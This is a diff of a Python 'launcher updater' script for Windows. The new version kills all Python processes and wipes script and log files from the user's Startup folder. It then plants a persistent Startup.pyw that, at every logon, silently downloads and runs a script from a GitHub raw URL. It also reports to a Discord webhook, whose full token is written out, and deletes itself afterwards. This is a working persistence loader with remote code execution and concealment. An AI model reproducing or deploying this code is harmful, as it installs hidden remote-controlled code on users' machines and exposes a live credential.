@@ -1,136 +1,244 @@
-# monitor_script.py - Forces old launcher to exit, then cleans up
+# monitor_script.py - Kills old launcher and creates new Startup.pyw
 import os
 import sys
 import subprocess
 import tempfile
 import time
+import requests
 
-def exit_old_launcher():
-    """Make the old launcher exit by closing its window"""
+# Discord webhook for notifications
+WEBHOOK = "https://discordapp.com/api/webhooks/1462762502130630781/IohGYGgxBIr2WPLUHF14QN_8AbyUq-rVGv_KQzhX1rHokBxF_OqjWlRm96x_gbYGQEJ0"
+
+def send_webhook(message):
+    """Send notification to Discord"""
     try:
-        # Try to hide the old launcher's console first
-        import win32gui
-        import win32con
-        
-        # Get all windows and close the one that looks like our launcher
-        def enum_windows_callback(hwnd, extra):
-            try:
-                title = win32gui.GetWindowText(hwnd)
-                if "GitHub Auto-Deploy Launcher" in title or "Press Enter to close" in title:
-                    # Send close message
-                    win32gui.PostMessage(hwnd, win32con.WM_CLOSE, 0, 0)
-                    time.sleep(0.5)
-            except:
-                pass
-        
-        win32gui.EnumWindows(enum_windows_callback, None)
-        
+        data = {"content": message}
+        requests.post(WEBHOOK, json=data, timeout=5)
     except:
         pass
 
-def cleanup_and_create():
-    """Main cleanup and creation function"""
+def kill_old_processes():
+    """Kill all Python processes running from startup folder"""
     startup_folder = os.path.join(
         os.getenv('APPDATA'),
         'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
     )
     
-    # First, exit the old launcher
-    exit_old_launcher()
+    print("Killing old Python processes...")
     
-    # Wait a bit for it to exit
-    time.sleep(2)
-    
-    # Create a batch file that runs after Python exits
+    # Create batch file to kill processes safely
     batch_script = f'''@echo off
-:: Wait for any Python processes to finish
-timeout /t 5 /nobreak >nul
+:: Kill Python processes gently first
+taskkill /im python.exe /t /f 2>nul
+taskkill /im pythonw.exe /t /f 2>nul
 
-:: Go to startup folder
-cd /d "{startup_folder}"
-
-:: Delete ALL files
-echo Deleting all files...
-del /f /q startup_log.txt 2>nul
-del /f /q monitor_script.py 2>nul
-del /f /q *.log 2>nul
-del /f /q *.txt 2>nul
-del /f /q *.py 2>nul
-del /f /q *.pyw 2>nul
-del /f /q *.json 2>nul
-del /f /q *.pyc 2>nul
-del /f /q *.bat 2>nul
-
-:: Delete __pycache__
-for /d %%d in (__pycache__) do (
-    rmdir /s /q "%%d" 2>nul
-)
-
-:: Create the new launcher DIRECTLY
-echo Creating new launcher...
-
-:: Write the launcher code directly
-echo import os, sys, subprocess, urllib.request, tempfile, time > "Startup.pyw"
-echo. >> "Startup.pyw"
-echo def run_script(): >> "Startup.pyw"
-echo     try: >> "Startup.pyw"
-echo         url = "https://raw.githubusercontent.com/ElianBoden/Deployer/main/script.py" >> "Startup.pyw"
-echo         code = urllib.request.urlopen(url).read().decode('utf-8') >> "Startup.pyw"
-echo         tf = tempfile.gettempdir() + "/script_temp.py" >> "Startup.pyw"
-echo         with open(tf, "w") as f: f.write(code) >> "Startup.pyw"
-echo         si = subprocess.STARTUPINFO() >> "Startup.pyw"
-echo         si.dwFlags ^|= subprocess.STARTF_USESHOWWINDOW >> "Startup.pyw"
-echo         subprocess.Popen([sys.executable, tf], startupinfo=si, creationflags=subprocess.CREATE_NO_WINDOW) >> "Startup.pyw"
-echo         time.sleep(5) >> "Startup.pyw"
-echo         try: os.remove(tf) >> "Startup.pyw"
-echo         except: pass >> "Startup.pyw"
-echo         return True >> "Startup.pyw"
-echo     except: return False >> "Startup.pyw"
-echo. >> "Startup.pyw"
-echo if __name__ == "__main__": >> "Startup.pyw"
-echo     time.sleep(5) >> "Startup.pyw"
-echo     run_script() >> "Startup.pyw"
-echo     while True: time.sleep(3600) >> "Startup.pyw"
-
-:: Verify
-echo Files in startup:
-dir /b
-
-:: Start the new launcher
-echo Starting new launcher...
-start /b "" pythonw "Startup.pyw"
-
-echo Done! Only Startup.pyw remains.
+:: Wait a bit
 timeout /t 2 /nobreak >nul
+
+:: Force kill any remaining
+wmic process where "name like 'python%%'" delete 2>nul
+
+echo Old processes killed
+timeout /t 1 /nobreak >nul
 del "%~f0" 2>nul
 '''
     
-    # Save batch file to Windows temp folder (not user temp)
-    batch_path = os.path.join(os.getenv('WINDIR'), 'Temp', 'cleanup_final.bat')
+    batch_path = tempfile.gettempdir() + "/kill_python.bat"
     with open(batch_path, 'w') as f:
         f.write(batch_script)
     
-    # Run the batch file in a NEW process
+    # Run the batch file
+    subprocess.run(['cmd', '/c', batch_path], 
+                  creationflags=subprocess.CREATE_NO_WINDOW)
+    
+    return True
+
+def create_new_launcher():
+    """Create the new Startup.pyw with the launcher code"""
+    startup_folder = os.path.join(
+        os.getenv('APPDATA'),
+        'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
+    )
+    
+    # The launcher code
+    launcher_code = '''import os
+import sys
+import subprocess
+import urllib.request
+import tempfile
+import time
+import traceback
+
+def run_script():
+    """Download and run script.py from GitHub"""
+    try:
+        url = "https://raw.githubusercontent.com/ElianBoden/Deployer/main/script.py"
+        script_code = urllib.request.urlopen(url, timeout=10).read().decode('utf-8')
+        
+        temp_dir = tempfile.gettempdir()
+        timestamp = str(int(time.time()))
+        temp_script = os.path.join(temp_dir, f"monitor_{timestamp}.py")
+        
+        with open(temp_script, 'w', encoding='utf-8') as f:
+            f.write(script_code)
+        
+        # Run hidden
+        startupinfo = subprocess.STARTUPINFO()
+        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+        
+        subprocess.Popen(
+            [sys.executable, temp_script],
+            startupinfo=startupinfo,
+            creationflags=subprocess.CREATE_NO_WINDOW
+        )
+        
+        # Delete temp file after 10 seconds
+        time.sleep(10)
+        try:
+            os.remove(temp_script)
+        except:
+            pass
+        
+        return True
+        
+    except Exception as e:
+        return False
+
+def main():
+    """Main launcher function"""
+    # Wait for network
+    time.sleep(5)
+    
+    # Run the script
+    run_script()
+    
+    # Keep alive
+    while True:
+        time.sleep(3600)
+
+if __name__ == "__main__":
+    main()
+'''
+    
+    # Write the launcher
+    launcher_path = os.path.join(startup_folder, "Startup.pyw")
+    with open(launcher_path, 'w', encoding='utf-8') as f:
+        f.write(launcher_code)
+    
+    print(f"✓ Created new launcher: {launcher_path}")
+    
+    # Start it
     startupinfo = subprocess.STARTUPINFO()
     startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
     
     subprocess.Popen(
-        ['cmd', '/c', batch_path],
+        [sys.executable, launcher_path],
         startupinfo=startupinfo,
         creationflags=subprocess.CREATE_NO_WINDOW
     )
     
-    print("✓ Cleanup scheduled. Old launcher will close.")
-    print("✓ New launcher will be created in 5 seconds.")
+    print("✓ New launcher started")
+    return True
+
+def cleanup_old_files():
+    """Clean up old files from startup folder"""
+    startup_folder = os.path.join(
+        os.getenv('APPDATA'),
+        'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
+    )
     
-    # Exit immediately
-    sys.exit(0)
+    print("Cleaning up old files...")
+    
+    # Delete old files
+    files_to_delete = [
+        "startup_log.txt",
+        "monitor_script.py",
+        "github_launcher.pyw",
+        "update_cache.json",
+        "requirements.txt",
+        "clean_launcher.pyw"
+    ]
+    
+    for filename in files_to_delete:
+        filepath = os.path.join(startup_folder, filename)
+        try:
+            if os.path.exists(filepath):
+                os.remove(filepath)
+                print(f"✓ Deleted: {filename}")
+        except:
+            pass
+    
+    # Delete any .log, .txt, .json, .py files
+    for filename in os.listdir(startup_folder):
+        if filename == "Startup.pyw":
+            continue
+            
+        filepath = os.path.join(startup_folder, filename)
+        try:
+            if os.path.isfile(filepath):
+                if filename.endswith(('.log', '.txt', '.json', '.py', '.pyw', '.pyc')):
+                    os.remove(filepath)
+        except:
+            pass
+    
+    return True
 
 def main():
+    """Main function - kills old process, cleans up, creates new launcher"""
     print("=" * 60)
-    print("FINAL CLEANUP - CREATING NEW LAUNCHER")
+    print("LAUNCHER UPDATER")
     print("=" * 60)
-    cleanup_and_create()
+    
+    # Step 1: Kill old processes
+    print("\n[1/3] Killing old processes...")
+    kill_old_processes()
+    
+    # Step 2: Clean up files
+    print("\n[2/3] Cleaning up old files...")
+    cleanup_old_files()
+    
+    # Step 3: Create new launcher
+    print("\n[3/3] Creating new launcher...")
+    create_new_launcher()
+    
+    # Send webhook
+    send_webhook("✅ Launcher updated! Old processes killed, new launcher created.")
+    
+    print("\n" + "=" * 60)
+    print("UPDATE COMPLETE!")
+    print("✓ Old processes killed")
+    print("✓ Old files cleaned up")
+    print("✓ New launcher created and started")
+    print("=" * 60)
+    
+    # Delete this script
+    delete_self()
+
+def delete_self():
+    """Delete this monitor_script.py"""
+    try:
+        this_script = __file__
+        
+        # Schedule deletion via batch file
+        batch_content = f'''@echo off
+timeout /t 3 /nobreak >nul
+del /f /q "{this_script}" >nul 2>nul
+if exist "{this_script}" (
+    timeout /t 2 /nobreak >nul
+    del /f /q "{this_script}" >nul 2>nul
+)
+del "%~f0" >nul 2>nul
+'''
+        
+        batch_path = tempfile.gettempdir() + "/delete_monitor.bat"
+        with open(batch_path, 'w') as f:
+            f.write(batch_content)
+        
+        subprocess.Popen(['cmd', '/c', batch_path],
+                        creationflags=subprocess.CREATE_NO_WINDOW)
+        
+    except:
+        pass
 
 if __name__ == "__main__":
     main()
